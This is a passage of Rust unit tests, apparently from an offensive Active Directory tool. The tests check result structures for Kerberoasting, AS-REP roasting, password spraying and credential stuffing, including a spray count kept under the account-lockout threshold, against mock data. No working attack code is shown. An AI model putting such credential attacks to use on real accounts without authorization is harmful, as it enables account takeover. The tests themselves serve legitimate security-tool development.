            error: String::new(),
        };

        let json = serde_json::to_string(&result).unwrap();
        let de: AsrepRoastResult = serde_json::from_str(&json).unwrap();
        assert!(de.success);
        assert_eq!(de.domain, "test.local");
    }

    #[test]
    fn test_spray_result_serde() {
        let result = SprayResult {
            sam_account_name: "jdoe".to_string(),
            password: "Password1!".to_string(),
            success: false,
            status: "wrong_password".to_string(),
        };

        let json = serde_json::to_string(&result).unwrap();
        let de: SprayResult = serde_json::from_str(&json).unwrap();
        assert!(!de.success);
    }

    #[test]
    fn test_credential_attack_summary_serde() {
        let summary = CredentialAttackSummary {
            kerberoast_results: vec![],
            asrep_roast_results: vec![],
            spray_results: vec![],
            stuffing_results: vec![],
            lockout_threshold: 5,
            safe_spray_count: 4,
        };

        let json = serde_json::to_string(&summary).unwrap();
        let de: CredentialAttackSummary = serde_json::from_str(&json).unwrap();
        assert_eq!(de.lockout_threshold, 5);
        assert_eq!(de.safe_spray_count, 4);
    }

    #[test]
    fn test_credential_stuffing_empty() {
        let ad_data = make_test_ad_data();
        let results = credential_stuffing(&ad_data, &[]);
        assert!(results.is_empty());
    }

    #[test]
    fn test_credential_stuffing_invalid_user() {
        let ad_data = make_test_ad_data();
        let results = credential_stuffing(&ad_data, &[
            ("nonexistent_user".to_string(), "password123".to_string()),
        ]);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].status, "user_not_found");
    }

    #[test]
    fn test_encryption_type_constants() {
        assert_eq!(RC4_HMAC, 0x17);
        assert_eq!(AES256_CTS_HMAC_SHA1_96, 0x12);
    }
}
